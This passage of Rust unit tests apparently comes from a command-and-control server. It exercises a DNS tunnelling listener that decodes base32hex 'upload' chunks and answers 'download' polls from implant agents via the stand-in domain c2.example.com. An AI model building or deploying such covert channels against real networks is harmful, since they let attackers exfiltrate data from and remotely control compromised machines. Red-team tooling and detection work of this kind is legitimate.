        assert!(base32hex_decode("XY!").is_none());
        assert!(base32hex_decode("ZZZZ").is_none()); // Z is not in base32hex
    }

    #[test]
    fn parse_dns_query_extracts_labels_and_type() {
        let qname = "data.0-1-deadbeef.up.c2.example.com";
        let packet = build_dns_txt_query(0x1234, qname);
        let parsed = parse_dns_query(&packet).expect("parse failed");
        assert_eq!(parsed.id, 0x1234);
        assert_eq!(parsed.qtype, DNS_TYPE_TXT);
        assert_eq!(
            parsed.labels,
            &["data", "0-1-deadbeef", "up", "c2", "example", "com"]
        );
        // qname_raw includes zero terminator
        assert_eq!(*parsed.qname_raw.last().unwrap(), 0);
    }

    #[test]
    fn parse_dns_query_rejects_short_packets() {
        assert!(parse_dns_query(&[0u8; 3]).is_none());
    }

    #[test]
    fn parse_dns_query_rejects_multiple_questions() {
        let mut packet = build_dns_txt_query(1, "foo.bar");
        // Set qdcount = 2
        packet[4] = 0;
        packet[5] = 2;
        assert!(parse_dns_query(&packet).is_none());
    }

    #[test]
    fn parse_dns_c2_query_recognises_upload_query() {
        let data = b"hello";
        let b32 = base32hex_encode(data);
        let labels: Vec<String> = [b32.as_str(), "0-1-deadbeef", "up", "c2", "example", "com"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let result = parse_dns_c2_query(&labels, "c2.example.com");
        let Some(super::DnsC2Query::Upload { agent_id, seq, total, data: decoded }) = result
        else {
            panic!("expected Upload variant");
        };
        assert_eq!(agent_id, 0xDEAD_BEEF);
        assert_eq!(seq, 0);
        assert_eq!(total, 1);
        assert_eq!(decoded, b"hello");
    }

    #[test]
    fn parse_dns_c2_query_recognises_download_query() {
        let labels: Vec<String> =
            ["3-cafebabe", "dn", "c2", "example", "com"].iter().map(|s| s.to_string()).collect();
        let result = parse_dns_c2_query(&labels, "c2.example.com");
        let Some(super::DnsC2Query::Download { agent_id, seq }) = result else {
            panic!("expected Download variant");
        };
        assert_eq!(agent_id, 0xCAFE_BABE);
        assert_eq!(seq, 3);
    }

    #[test]
    fn parse_dns_c2_query_rejects_wrong_domain() {
        let labels: Vec<String> =
            ["data", "0-1-deadbeef", "up", "other", "domain", "com"]
                .iter()
                .map(|s| s.to_string())
                .collect();
        assert!(parse_dns_c2_query(&labels, "c2.example.com").is_none());
    }

    #[test]
    fn build_dns_txt_response_produces_parseable_answer() {
        let packet = build_dns_txt_query(0xABCD, "test.c2.example.com");
        let parsed = parse_dns_query(&packet).expect("parse failed");
        let txt = b"ok";
        let response = build_dns_txt_response(parsed.id, &parsed.qname_raw, txt);

        // Response must be at least header + question + answer
        assert!(response.len() >= DNS_HEADER_LEN);
        // QR bit set
        assert!(response[2] & 0x80 != 0, "QR bit not set");
        // ANCOUNT = 1
        let ancount = u16::from_be_bytes([response[6], response[7]]);
        assert_eq!(ancount, 1);
    }

    #[test]
    fn chunk_response_splits_payload_into_base32hex_chunks() {
        let payload = vec![0xABu8; 300]; // 300 bytes > 1 chunk (125 bytes each)
        let chunks = chunk_response_to_b32hex(&payload);
        assert_eq!(chunks.len(), 3); // ceil(300/125) = 3
        // Each chunk decodes back to the expected slice
        let mut reassembled = Vec::new();
        for chunk in &chunks {
            let decoded = base32hex_decode(chunk).expect("chunk decode failed");
            reassembled.extend_from_slice(&decoded);
        }
        assert_eq!(reassembled, payload);
    }

    #[tokio::test]
    async fn dns_listener_starts_and_responds_to_unknown_queries_with_refused() {
        let port = free_udp_port();
        let manager = manager().await.expect("manager creation failed");
        let config = dns_listener_config("dns-test", port, "c2.example.com");
        manager.create(config).await.expect("create failed");
        manager.start("dns-test").await.expect("start failed");

        // Brief delay for the listener to bind
        sleep(Duration::from_millis(50)).await;

        let client = TokioUdpSocket::bind("127.0.0.1:0").await.expect("client bind failed");
        client.connect(format!("127.0.0.1:{port}")).await.expect("connect failed");

        // Send a query for an unrecognised C2 domain — expect REFUSED
        let packet = build_dns_txt_query(0x1111, "something.other.domain.com");
        client.send(&packet).await.expect("send failed");

        let mut buf = vec![0u8; 512];
        tokio::time::timeout(Duration::from_secs(2), client.recv(&mut buf))
            .await
            .expect("no response received")
            .expect("recv failed");

        // RCODE should be 5 (REFUSED)
        let rcode = buf[3] & 0x0F;
        assert_eq!(rcode, 5, "expected REFUSED RCODE");
    }

    #[tokio::test]
    async fn dns_listener_download_poll_returns_wait_when_no_response_queued() {
        let port = free_udp_port();
        let manager = manager().await.expect("manager creation failed");
        let config = dns_listener_config("dns-wait", port, "c2.example.com");
        manager.create(config).await.expect("create failed");
        manager.start("dns-wait").await.expect("start failed");

        sleep(Duration::from_millis(50)).await;

        let client = TokioUdpSocket::bind("127.0.0.1:0").await.expect("client bind failed");
        client.connect(format!("127.0.0.1:{port}")).await.expect("connect failed");

        // Download poll for agent 0xDEADBEEF, seq 0
        let qname = "0-deadbeef.dn.c2.example.com";
        let packet = build_dns_txt_query(0x2222, qname);
        client.send(&packet).await.expect("send failed");

        let mut buf = vec![0u8; 512];
        tokio::time::timeout(Duration::from_secs(2), client.recv(&mut buf))
            .await
            .expect("no response received")
            .expect("recv failed");

        // NOERROR (RCODE=0)
        let rcode = buf[3] & 0x0F;
        assert_eq!(rcode, 0, "expected NOERROR");

        // ANCOUNT = 1
        let ancount = u16::from_be_bytes([buf[6], buf[7]]);
        assert_eq!(ancount, 1);
    }
}
